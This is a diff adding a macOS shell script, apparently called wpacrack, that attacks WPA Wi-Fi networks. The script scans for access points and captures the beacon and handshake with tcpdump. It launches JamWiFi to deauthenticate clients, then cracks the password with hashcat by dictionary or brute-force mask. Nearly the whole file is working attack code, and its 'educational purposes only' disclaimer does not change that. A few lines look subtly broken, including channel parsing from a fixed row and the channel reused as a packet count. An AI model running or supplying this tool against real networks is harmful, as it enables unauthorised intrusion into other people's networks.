@@ -1,0 +1,151 @@
+#!/bin/sh
+
+: '
+ /$$      /$$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$                    /$$        /$$$$$$ 
+| $$  /$ | $$| $$__  $$ /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$| $$  /$$/                  /$$$$       /$$$_  $$
+| $$ /$$$| $$| $$  \ $$| $$  \ $$| $$  \__/| $$  \ $$| $$  \ $$| $$  \__/| $$ /$$/        /$$    /$$|_  $$      | $$$$\ $$
+| $$/$$ $$ $$| $$$$$$$/| $$$$$$$$| $$      | $$$$$$$/| $$$$$$$$| $$      | $$$$$/        |  $$  /$$/  | $$      | $$ $$ $$
+| $$$$_  $$$$| $$____/ | $$__  $$| $$      | $$__  $$| $$__  $$| $$      | $$  $$         \  $$/$$/   | $$      | $$\ $$$$
+| $$$/ \  $$$| $$      | $$  | $$| $$    $$| $$  \ $$| $$  | $$| $$    $$| $$\  $$         \  $$$/    | $$      | $$ \ $$$
+| $$/   \  $$| $$      | $$  | $$|  $$$$$$/| $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$         \  $/    /$$$$$$ /$$|  $$$$$$/
+|__/     \__/|__/      |__/  |__/ \______/ |__/  |__/|__/  |__/ \______/ |__/  \__/          \_/    |______/|__/ \______/ 
+                                                                                                                          
+                                                                Written by Jared Butterfield
+
+DISCLAIMER
+
+This program is intended for educational purposes only. Running wpacrack against 
+networks without prior mutual consent is illegal. You are responsible for your own actions. 
+I accept no liability and am not responsible for any misuse or damage caused by wpacrack.
+'
+
+# check if wpacrack was ran as root
+if [[ "$EUID" -ne 0 ]]
+then 
+    echo "wpacrack requires root privelages, please run using sudo"
+    exit 1
+fi
+
+# if airport is not in PATH link it
+command -v airport >/dev/null 2>&1 || sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
+
+# choose network interface
+ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active' | sed '/\w*[0-3]: /!d' | cut -d ":" -f 1 > interfaces
+echo "\n[*] Network interfaces found"
+echo
+nl interfaces
+
+choose_interface() {
+    echo
+    read -p "Enter the number corresponding to the interface you would like to use: " chosen_interface
+    echo
+    sed ''"$chosen_interface"'q;d' interfaces
+    echo
+    read -p "Is this the correct interface? [Y/N]: " response
+}
+
+choose_interface
+
+until [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
+do
+    choose_interface
+done
+
+# set interface
+INTERFACE=$(sed ''"$chosen_interface"'q;d' interfaces)
+
+# delete interfaces file
+rm interfaces
+
+# scan for wireless access points and have user choose BSSID and channel
+echo "\n[*] Scanning wireless access points...\n"
+sudo airport $INTERFACE -s > scan
+sed -n '1!p' scan | nl
+
+choose_ap() {
+    echo
+    read -p "Enter the number corresponding to the access point you would like to attack: " chosen_ap
+    echo
+    sed -n '1!p' scan | sed ''"$chosen_ap"'q;d'
+    echo
+    read -p "Is this the correct access point? [Y/N]: " response
+}
+
+choose_ap
+
+until [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
+do
+    choose_ap
+done
+
+# set BSSID and channel for later use
+BSSID=$(sed -n '1!p' scan | sed ''"$chosen_ap"'q;d' | grep -E -o "([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
+CHANNEL=$(sed -n '1!p' scan | sed ''"3"'q;d' | awk 'BEGIN {FS="([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"} ; { print $2 }' | awk '{print $2}' | cut -d "," -f 1)
+
+# delete scan file
+rm scan
+
+# disassociate
+sudo airport -z
+
+# set the channel
+sudo airport -c$CHANNEL
+
+# capture a beacon frame from the AP
+sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c $CHANNEL -i $INTERFACE -w beacon.cap
+
+# wait for the WPA handshake
+sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w handshake.cap
+
+# open JamWifi to deauth access point and retrieve handshake
+open dependencies/JamWiFi.app
+
+# merge the two files
+dependencies/joincap -w capture.cap beacon.cap handshake.cap
+
+# convert capture file to hccapx format
+dependencies/cap2hccapx capture.cap capture.hccapx
+
+# crack with hashcat
+echo
+read -p "Enter \"d\" to use a dictionary attack or \"b\" to use a brute force attack: " attack_choice
+
+if [[ $attack_choice = "d" ]]
+then
+    ls wordlists > wordlist_choices
+    echo
+    nl wordlist_choices
+
+    choose_dictionary() {
+        echo
+        read -p "Enter the number corresponding to the dictionary you would like to use: " chosen_dictionary
+        echo
+        sed ''"$chosen_dictionary"'q;d' wordlist_choices | cut -d " " -f 2
+        echo
+        read -p "Is this the correct password dictionary? [Y/N]: " response
+    }
+
+    choose_dictionary
+
+    until [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
+    do
+        choose_dictionary
+    done
+
+    # set dictionary variable
+    DICTIONARY=$(sed ''"$chosen_dictionary"'q;d' wordlist_choices | cut -d " " -f 2)
+
+    # remove wordlist_choices file
+    rm wordlist_choices
+
+    dependencies/hashcat -m 2500 capture.hccapx $DICTIONARY -O
+elif [[ $attack_choice = "b" ]]
+then
+    echo
+    read -p "Enter the mask you would like to use \(ex: ?d?d?d for 3 digits\): " mask
+
+    dependencies/hashcat -m 2500 -a 3 capture.hccapx "$mask" -O
+fi
+
+# cleanup
+rm capture.cap beacon.cap capture.hccapx handshake.cap
